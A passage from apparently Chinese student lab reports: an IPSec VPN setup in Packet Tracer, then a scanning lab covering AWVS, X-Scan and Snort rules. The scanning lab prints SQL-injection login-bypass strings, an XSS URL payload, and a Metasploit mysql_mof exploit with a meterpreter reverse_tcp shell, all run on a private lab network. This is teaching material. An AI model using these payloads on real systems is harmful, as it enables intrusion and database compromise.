alt="1565753511671"></p></li><li><p>重复上述操作，配置六台PC，它们的IP地址分别为</p><ul><li><code>192.168.1.10</code></li><li><code>192.168.1.20</code></li><li><code>192.168.1.30</code></li><li><code>192.168.2.10</code></li><li><code>192.168.2.20</code></li><li><code>192.168.2.30</code></li></ul><p>子网掩码全为<code>255.255.255.0</code>，前三台网关为<code>192.168.1.1</code>，后三台网关为<code>192.168.2.1</code></p></li><li><p>选取交换机<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753557584.png" alt="1565753557584">)拖至工作区，在<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753568432.png" alt="1565753568432">)中选取<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753573910.png" alt="1565753573910">将路由器于交换机相连，将交换机于PC相连；最终完成如图所示的网络图</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753598090.png" alt="1565753598090"></p></li></ol><h2 id="配置路由"><a href="#配置路由" class="headerlink" title="配置路由"></a>配置路由</h2><p>在路由器中配置路由，使路由器两端的网络互通</p><ol><li><p>配置<code>router 0</code>，双击<code>router 0</code>图标，选择<code>CLI项</code>，进入路由器配置窗口，输入命令如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Router&gt;en</span><br><span class="line">Router#configure  terminal</span><br><span class="line">Router(config)# ip route 0.0.0.0  0.0.0.0 fastEthernet 0&#x2F;0  &#x2F;&#x2F;配置内网访问外部网络的出口路由</span><br><span class="line">Router(config)#ip route 192.168.1.0  255.255.255.0  fastEthernet  0&#x2F;1  &#x2F;&#x2F;配置外部访问内部网络入口路由</span><br><span class="line">Router(config)#end</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753735869.png" alt="1565753735869"></p></li><li><p>配置<code>router 1</code>，双击<code>router 1</code>图标，选择<code>CLI项</code>，进入路由器配置窗口，输入命令如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Router&gt;en</span><br><span class="line">Router#configure  terminal</span><br><span class="line">Router(config)# ip route 0.0.0.0  0.0.0.0 fastEthernet 0&#x2F;0  &#x2F;&#x2F;配置内网访问外部网络的出口路由</span><br><span class="line">Router(config)#ip route 192.168.2.0  255.255.255.0  fastEthernet  0&#x2F;1  &#x2F;&#x2F;配置外部访问内部网络入口路由</span><br><span class="line">Router(config)#end</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753789862.png" alt="1565753789862"></p></li></ol><h2 id="测试网络的互通性"><a href="#测试网络的互通性" class="headerlink" title="测试网络的互通性"></a>测试网络的互通性</h2><ol><li><p>双击<code>PC0图标</code>，在弹出的对话框中，选择<code>Desktop</code>，选择<code>Command Prompt</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753835594.png" alt="1565753835594"></p></li><li><p>使用<code>ping</code>命令，<code>ping</code> <code>192.168.1.1</code>、<code>10.0.0.1</code>、<code>192.168.2.10</code>、<code>10.0.0.2</code>、<code>192.168.3.10</code>结果除了最后一个地址(该地址不存在)其它全能<code>ping</code>通，表明搭建的网络满足实验环境</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753900939.png" alt="1565753900939"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753905408.png" alt="1565753905408"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753915519.png" alt="1565753915519"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753921041.png" alt="1565753921041"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753925827.png" alt="1565753925827"></p></li></ol><h2 id="配置IPSec-VPN"><a href="#配置IPSec-VPN" class="headerlink" title="配置IPSec VPN"></a>配置IPSec VPN</h2><ol><li><p>配置<code>router 0</code>，双击<code>router 0</code>图标，选择<code>CLI项</code>，进入路由器配置窗口</p><ol><li><p>定义<code>IKE</code>的策略(<code>router 0</code>和<code>router1</code>之间的密钥交换策略)，<code>IKE</code>只是密钥的交换策略,在使用加密对称和非对称加密算法的时候,需要密钥来对数据加密,下面的IKE策略只是建立一条管理连接，负责加密生成的各种密钥，输入命令如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Router#configure terminal&#x2F;&#x2F;进入配置状态，通过端口进行配置</span><br><span class="line">Router (config)#crypto isakmp policy 10&#x2F;&#x2F;一个IKE的策略，号码是10，数字越低，策略优先级越高</span><br><span class="line">Router (config-isakmp)# authentication pre-share&#x2F;&#x2F;使用预定义共享密钥进行设备认证</span><br><span class="line">Router (config-isakmp)#hash md5   &#x2F;&#x2F;认证方式使用MD5进行认证</span><br><span class="line">Router (config-isakmp)#encryption des&#x2F;&#x2F;加密方式使用DES，可选AES&#x2F;DES</span><br><span class="line">Router (config-isakmp)#group 2&#x2F;&#x2F;指定DH组</span><br><span class="line">Router (config-isakmp)# lifetime 86400&#x2F;&#x2F;对生成新SA的周期进行调整，两端的路由器都要设置相同的SA周期</span><br><span class="line">Router (config-isakmp)# exit</span><br><span class="line">Router (config)#crypto isakmp key leeyuxun address 10.0.0.2   &#x2F;&#x2F;定义一个密码,密码是leeyuxun，和地址为10.0.0.2的设备去交换密钥</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754108455.png" alt="1565754108455"></p></li><li><p>定义数据的<code>加密方式</code>和<code>认证方式</code>，配置<code>IPSec</code>，输入命令如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Router (config)#access-list 110 permit ip 192.168.1.0 0.0.0.255 192.168.2.0  0.0.0.255&#x2F;&#x2F;定义访问控制列表,这里的访问控制列表不是对数据进行过滤，是定义那些数据应该被加密，也可以理解哪些数据触发IPSec 流</span><br><span class="line">Router (config)#crypto ipsec transform-set mine esp-des esp-md5-hmac&#x2F;&#x2F;设置数据的加密方式，策略名字为mine，使用ESP-DES对数据加密，ESP-MD5-HMAC对数据认证</span><br><span class="line">Router(config)# crypto map mymap 101 ipsec-isakmp  &#x2F;&#x2F;定义一个map,调用刚才做的策略</span><br><span class="line">Router(config-crypto-map)# match address 110&#x2F;&#x2F;匹配出访问控制列表110的数据</span><br><span class="line">Router(config-crypto-map)# set peer 10.0.0.2      &#x2F;&#x2F;标识对端路由器的合法IP地址</span><br><span class="line">Router(config-crypto-map)# set pfs group2</span><br><span class="line">Router(config-crypto-map)# set transform-set mine  &#x2F;&#x2F;使用刚才定义好的策略对数据加密</span><br><span class="line">Router(config-crypto-map)# set security-association lifetime seconds 86400&#x2F;&#x2F;指定IPSec SA的存活期</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754214633.png" alt="1565754214633"></p></li><li><p>将<code>map</code>映射到<code>公网端口</code>，一个端口只能映射一个<code>map</code>，输入命令如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Router（config）interface fastEthernet 0&#x2F;0</span><br><span class="line">Router(config-if)#crypto map mymap</span><br><span class="line">*Jan  3 07:16:26.785: %CRYPTO-6-ISAKMP_ON_OFF: ISAKMP is ON</span><br><span class="line">Router（config-if）end</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754280097.png" alt="1565754280097"></p></li><li><p>查看策略</p><ol><li><p>查看<code>IKE策略</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Router# show crypto ipsec transform-set</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754404902.png" alt="1565754404902"></p></li><li><p>查看<code>IPSec变换集</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Router# show crypto ipsec transform-set</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754395872.png" alt="1565754395872"></p></li><li><p>查看 <code>crypto maps</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Router# show crypto map</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754412022.png" alt="1565754412022"></p></li></ol></li></ol></li><li><p>配置<code>router 1</code>，双击<code>router 1</code>图标，选择<code>CLI项</code>，进入路由器配置窗口</p><ol><li><p>定义<code>IKE</code>的策略，与配置<code>route 0</code>相同</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754476249.png" alt="1565754476249"></p></li><li><p>定义数据的加密方式和认证方式，配置<code>IPSec</code>，与配置<code>route 0</code>相同</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754507611.png" alt="1565754507611"></p></li><li><p>将<code>map</code>映射到<code>公网端口</code>，与配置<code>route 0</code>相同</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754534083.png" alt="1565754534083"></p></li></ol></li></ol><h2 id="测试IPSec-VPN"><a href="#测试IPSec-VPN" class="headerlink" title="测试IPSec VPN"></a>测试IPSec VPN</h2><ol><li><p>测试<code>VPN连通性</code></p><p>双击<code>PC0</code>图标，在弹出的对话框中，选择<code>Desktop</code>，选择<code>Command Prompt</code>，<code>ping 192.168.2.10</code>，如下图所示</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754619936.png" alt="1565754619936"></p></li><li><p>验证数据经过<code>IPSec VPN</code> <code>加密传输</code>，点击进入<code>simulation mode</code>，弹出如图所示对话框</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754651966.png" alt="1565754651966"></p></li><li><p>重复上一步操作，<code>simulation Panel</code>中选取<code>Auto Capture</code>，观察工作区动画，展示了数据包在网络中的传送过程</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754673001.png" alt="1565754673001"></p></li><li><p>双击路由器<code>router 0</code>处数据包，弹出如图所示弹框，可以分析出数据包的信息</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754694830.png" alt="1565754694830"></p><ul><li>进入路由器的数据包（左侧）的信息源IP是<code>192.168.1.10</code>，目的IP是<code>192.168.2.10</code></li><li>路由器出去的数据包(右侧)的源IP改变为<code>10.0.0.1</code>，目的IP变为<code>10.0.0.2</code></li><li>从上图的第六条信息中发现<code>ESP encrypts the received packet</code>的信息</li><li>综上，从<code>PC0</code>（<code>192.168.1.10</code>）发往对端<code>PC3</code>（<code>192.168.2.10</code>）的数据经过了路由器的<code>IPSec VPN</code>模块加密处理，隐藏了内网的IP地址信息，从而保护了内网的数据</li></ul></li><li><p>断开<code>VPN</code></p><ol><li><p>断开<code>router 0</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Router（config）#interface fastEthernet 0&#x2F;0</span><br><span class="line">Router(config-if)#no crypto map mymap</span><br><span class="line">Router（config-if）end</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754841629.png" alt="1565754841629"></p></li><li><p>双击<code>PC0</code>图标，在弹出的对话框中，选择<code>Desktop</code>，选择<code>Command Prompt</code>，<code>ping 192.168.2.10</code>，<code>ping</code>不通，表明只断开一端路由器的端口<code>map映射</code>，两边无法连通</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754877800.png" alt="1565754877800"></p></li><li><p>以同样的方式断开route 1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Router（config）#interface fastEthernet 0&#x2F;0</span><br><span class="line">Router(config-if)#no crypto map mymap</span><br><span class="line">Router（config-if）end</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754906347.png" alt="1565754906347"></p></li><li><p>双击<code>PC0</code>图标，在弹出的对话框中，选择<code>Desktop</code>，选择<code>Command Prompt</code>，<code>ping 192.168.2.10</code>，<code>ping</code>成功，表明两端都断开后，两边网络可以再次保持连接</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565754947901.png" alt="1565754947901"></p></li><li><p>抓取经过<code>route 0</code>的数据包，发现数据不再加密传输。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565761734124.png" alt="1565761734124"></p></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络安全实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> VPN配置 </tag>
            
            <tag> IPSec </tag>
            
            <tag> PacketTracer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络扫描 实验报告</title>
      <link href="/%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.html"/>
      <url>/%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><ol><li>了解网站<code>Sql注入漏洞</code>、<code>XSS漏洞</code>原理，通过<code>AWVS</code>软件对目标网站进行漏洞扫描实验，分析<code>Sql注入漏洞</code>和<code>XSS漏洞</code>扫描的原理及结果。</li><li>用<code>xscan</code>或<code>nessus</code>软件进行主机、端口、漏洞扫描实验，捕获扫描时交互的数据包，通过分析扫描数据包，验证扫描原理。</li><li>在<code>Windows</code>或<code>Linux</code>平台搭建<code>Snort IDS</code>，自己编写检测规则文件，对<code>xscan</code>或<code>nessus</code>软件网络扫描进行检测。</li><li>了解<code>Metasploit Framework</code>渗透测试工具，对<code>mysql数据库漏洞</code>进行渗透测试。<a id="more"></a></li></ol><h1 id="AWVS扫描漏洞"><a href="#AWVS扫描漏洞" class="headerlink" title="AWVS扫描漏洞"></a>AWVS扫描漏洞</h1><p>通过AWVS软件对目标网站进行漏洞扫描实验，分析Sql注入漏洞和XSS漏洞扫描的原理及结果。</p><ol><li><p>自己搭建SQL注入攻击漏洞网站：<code>http://10.122.251.244/SQL/</code>(已无法访问)并使用AWVS进行扫描。查看扫描结果，发现网站存在SQL注入漏洞。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565689438814.png" alt="1565689438814"></p></li><li><p>分析SQL注入漏洞，当在输入框中输入<code>1&#39; OR 3*2*1=6 AND 000429=000429--</code>以绕过检测，直接登录。将输入的语句放在php语句中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;select* from users where username&#x3D;&#39;1&#39; OR 3*2*1&#x3D;6 AND</span><br><span class="line">000429&#x3D;000429 **--**&#39; and password&#x3D;&#39;$pwd&#39;&quot;;</span><br></pre></td></tr></table></figure><p> 该语句恒为true，故可以绕过验证直接登录。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565689649032.png" alt="1565689649032"></p></li><li><p>尝试在URL输入栏中输入：</p><p><code>http://10.122.251.244/sql/test.php?password=g00dPa%24%24w0rD&amp;username=-1&#39;%20OR%203*2*1%3d6%20AND%20000567%3d000567%20--%20</code> , 可以绕验证登录成功，同时说明了SQL注入攻击是通过输入改变后台SQL语句内容达到攻击目标数据库的目的。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565689780827.png" alt="1565689780827"></p></li><li><p>自己搭建xss漏洞网站：<code>http://10.122.251.244/XSS/</code>(已无法访问)并使用AWVS进行扫描。查看扫描结果，发现网站存在XSS漏洞。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565689840077.png" alt="1565689840077"></p></li><li><p>发现网页的输入框存在<code>跨站脚本攻击</code>，点击右侧的<code>view HTML response</code>，弹出对话框，攻击成功。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565689894657.png" alt="1565689894657"></p></li><li><p>按照说明点击<code>launch the attack with http editor</code>，发送报文，未弹出对话框，但是网页内容得到更改。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565689953549.png" alt="1565689953549"></p></li><li><p>在浏览器的URL栏输入内容如下<code>http://10.122.251.244//xss/index.php?input=1&#39;%22()%26%25prompt(“xss”)prompt(“xss”)&lt;/ScRiPt)&gt;</code>，成功弹出对话框，xss攻击成功。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565690032102.png" alt="1565690032102"></p></li><li><p>xss攻击原理是通过对网页注入可执行代码且成功地被浏览器执行，达到攻击的目的，而上面的攻击就是通过一个get请求输入一串可执行的script代码且成功被执行：输入的代码可执行代码是<code>&lt;ScRiPt%20&gt;prompt(&quot;XSS&quot;)&lt;/ScRiPt&gt;</code>,即执行弹出框，内容是xss。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565690254180.png" alt="1565690254180"></p></li></ol><h1 id="x-Scan漏洞扫描"><a href="#x-Scan漏洞扫描" class="headerlink" title="x-Scan漏洞扫描"></a>x-Scan漏洞扫描</h1><p>用x-Scan软件进行主机、端口、漏洞扫描。</p><ol><li><p>x-Scan软件扫描漏洞原理</p><ol><li>首先对主机进行端口扫描，确定系统开放的端口；</li><li>然后对开放的端口进行网络服务类型的识别，确定其提供的网络服务;</li><li>根据目标提供的网络服务，调用漏洞资料库中已知的各种漏洞进行逐一检测，通过对探测响应数据包的分析判断是否存在已知安全漏洞。</li></ol></li><li><p>在<code>windows7虚拟机</code>内运行<code>X-Scan</code>，并配置检测IP地址：<code>192.168.88.132</code>。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565690455956.png" alt="1565690455956"></p></li><li><p>配置扫描模块：漏洞检测脚本。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565690493036.png" alt="1565690493036"></p></li><li><p>扫描端口范围设置为1-65536，检测方式选择默认TCP。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565690527344.png" alt="1565690527344"></p></li><li><p>进行扫描。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565690553808.png" alt="1565690553808"></p></li><li><p>扫描完成，网页显示出被检测主机的详细漏洞信息，并给出了安全漏洞的详细信息及解决方案。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565690585737.png" alt="1565690585737"></p></li><li><p>扫描过程中使用Wireshark进行抓包。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565690617576.png" alt="1565690617576"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565690636729.png" alt="1565690636729"></p></li><li><p>分析wireshark捕获的数据包，发现扫描器先与目标主机在不同的端口建立不同的TCP连接，然后根据端口提供的网络服务类型调用漏洞资料库中已知的各种漏洞进行逐一检测，通过对探测响应数据包的分析判断是否存在已知安全漏洞。例如在扫描135端口时先在135端口上建立TCP连接，然后发送不同类型的协议请求(如DCERPC协议、EPM协议)来检测漏洞。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565690674299.png" alt="1565690674299"></p></li></ol><h1 id="搭建Snort-IDS"><a href="#搭建Snort-IDS" class="headerlink" title="搭建Snort IDS"></a>搭建Snort IDS</h1><ol><li><p>IDS简介：</p><p>​        <code>入侵检测系统（Intrusion Detection System,IDS）</code>的作用是<strong>监控网络和计算机系统是否出现被入侵或滥用的征兆。</strong>IDS系统不需要人工干预就可以不间断的地运行，能够发现异于正常的行为的操作。</p></li><li><p>实验环境：<br>服务平台：<code>windows 2003</code> (安装Snort)(<code>192.168.88.143</code>)<br>攻击平台：<code>windows 7</code> (测试snort)(<code>192.168.88.145</code>)<br>软件版本：   <code>snort2.8.0.2</code>、<code>apache2.2.8</code>、<code>php5.2</code>、<code>mysql5.0</code>、<code>winpcap4.0.2</code>、<code>acid0.9</code>、<code>adodb5</code>、<code>jpgraph2.3</code></p></li><li><p>在windows 2003上搭建Snort环境完成后，在目录：<code>C:\ids\Snort\bin</code>下打开命令行，输入<code>snort -W</code>，出现如下图案，说明snort安装成功。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565690887062.png" alt="1565690887062"></p></li><li><p>在目录文件<code>C:\ids\Snort\rules\local.rules</code>上添加一个规则：<code>alert icmp any any -&gt; $HOME_NET any (msg:&quot;icmp Packet&quot;;sid:1234567890;rev:1;)</code>，捕获任意主机发送到该主机的<code>ICMP</code>包。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565690945779.png" alt="1565690945779"></p></li><li><p>在目录：<code>C:\ids\Snort\bin</code>下打开命令行，输入<code>snort -i2 -l c:\ids\snort\log\ -c c:\ids\snort\etc\snort.conf -dev -p</code>，运行snort。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565690993993.png" alt="1565690993993"></p></li><li><p>Windows7主机对windows xp主机进行ping命令测试。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691019631.png" alt="1565691019631"></p></li><li><p>在windows 2003上打开网页：<code>http://localhost/acid/acid_main.php</code>，检测到ICMP包，分析为<code>192.168.88.145</code>，发送至<code>192.168.143</code>。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691068262.png" alt="1565691068262"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691085455.png" alt="1565691085455"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691111110.png" alt="1565691111110"></p></li><li><p>由于使用snort规则不熟练简单写了嗅探<code>TCP</code>、<code>UDP</code>、<code>ICMP</code>的规则，嗅探来自任何主机发送至该主机的数据包。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691163321.png" alt="1565691163321"></p></li><li><p>使用windows7对windows 2003进行X-scan扫描，同时开启snort扫描，X-scan扫描结果如下。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691191082.png" alt="1565691191082"></p></li><li><p>Snort嗅探结果如下，可以看出X-scan发出的基本上是<code>TCP包</code>。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691229389.png" alt="1565691229389"></p></li><li><p>截取捕获的部分TCP包如下，可以看出检测端口非常多。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691265544.png" alt="1565691265544"></p></li><li><p>点击一个TCP包，具体信息如下，从<code>192.168.88.143</code>的<code>292</code>端口发送至<code>192.168.88.145</code>的<code>51097</code>端口。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691312746.png" alt="1565691312746"></p></li><li><p>查看源IP地址如下，其中<code>192.168.88.1</code>是这次检测发送的源地址，<code>192.149.252.21</code>描述的是<code>gm2.arin.net</code>，不知道为什么会出现这个地址。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691362079.png" alt="1565691362079"></p></li><li><p>源端口有<code>4695</code>个，其中UDP端口<code>2</code>个，目的端口有<code>3379</code>个，其中UDP端口<code>2</code>个，基本上使用的是TCP端口。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691387127.png" alt="1565691387127"></p></li></ol><h1 id="mysql数据库漏洞渗透"><a href="#mysql数据库漏洞渗透" class="headerlink" title="mysql数据库漏洞渗透"></a>mysql数据库漏洞渗透</h1><p>了解Metasploit Framework渗透测试工具，对mysql数据库漏洞进行渗透测试。</p><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><ul><li>攻击机：Kali linux（攻击机和靶机位于同一局域网下）</li><li>靶机：windows xp (安装<code>mysql5.5.19</code>)</li><li>工具：<code>Metaspolit</code>：<code>Metaspolit</code>是一款开源的安全漏洞检测工具，其集成了各种平台上常见的溢出漏洞和流行的shellcode，并不断提供更新。</li></ul><h2 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h2><p><code>mysql 5.5.19</code>版本存在的<code>CVE-2012-5613</code>权限提升漏洞</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>利用<code>metaspolit</code>辅助模块<code>auxiliary</code>，对目标进行信息收集。</p><ol><li><p>输入<code>msfconsole</code>，运行<code>metaspolit</code>。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691796739.png" alt="1565691796739"></p></li><li><p>输入<code>show auxiliary</code>，查看所有辅助模块。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691835467.png" alt="1565691835467"></p></li><li><p>使用辅助模块：<code>MySQL Server Version Enumeration</code>，查看靶机的mysql版本信息。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691867189.png" alt="1565691867189"></p></li><li><p>输入命令：<code>use auxiliary/scanner/mysql/mysql_version</code>，调用<code>MySQL Server Version Enumeration</code>模块，输入命令<code>show options</code>，展示设置项。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691923481.png" alt="1565691923481"></p></li><li><p>端口为<code>3306</code>，线程为<code>1</code>，数据库连接端口，没有目标主机IP，设置扫描<code>192.168.88.2-254</code>，并再次显示设置项，设置成功。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565691970562.png" alt="1565691970562"></p></li><li><p>输入命令<code>exploit</code>，进行扫描。扫描结束后，发现IP地址为<code>192.168.88.128</code>的主机上的mysql版本为<code>5.5.19</code>，存在<code>CVE-2012-5613</code>漏洞。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565692007318.png" alt="1565692007318"></p></li></ol><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol><li><p>退回到<code>msf</code>，输入<code>search mysql</code>，检索<code>metaspolit</code>中集成的有关mysql的模块。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565692097710.png" alt="1565692097710"></p></li><li><p>选择<code>exploit/windows/mysql/mysql_mof</code>对目标主机进行本地提权，输入命令<code>use exploit/windows/mysql/mysql_mof</code>使用该模块，输入命令<code>show options</code>，展示设置项。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565692150667.png" alt="1565692150667"></p></li><li><p>发现用户名、密码、IP地址都没有输入，利用命令<code>set</code>输入用户名<code>root</code>，密码<code>root</code>，IP地址:<code>192.168.88.128</code>。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565692208251.png" alt="1565692208251"></p></li><li><p>选择加载模块<code>payloads</code>, 输入命令<code>show payloads</code>，查看<code>metaspolit</code>集成的加载模块。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565692245049.png" alt="1565692245049"></p></li><li><p>选择加载模块<code>windows/meterpreter/reverse_tcp</code>，输入命令：<code>set payload</code><br><code>windows/meterpreter/reverse_tcp</code>，输入命令<code>show options</code>，展示设置项，监听端口为<code>4444</code>。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565692329433.png" alt="1565692329433"></p></li><li><p>未设置监听地址<code>LHOST</code>，利用命令<code>set</code>设置监听地址为攻击机IP：<code>192.168.88.130</code>。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565692388669.png" alt="1565692388669"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565692402487.png" alt="1565692402487"></p></li><li><p>输入<code>exploit</code>进行攻击,连接成功，开始使用<code>meterpreter</code>工具。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565692436217.png" alt="1565692436217"></p></li><li><p>输入<code>getuid</code>，查看当前用户ID，发现为<code>Server username: NT 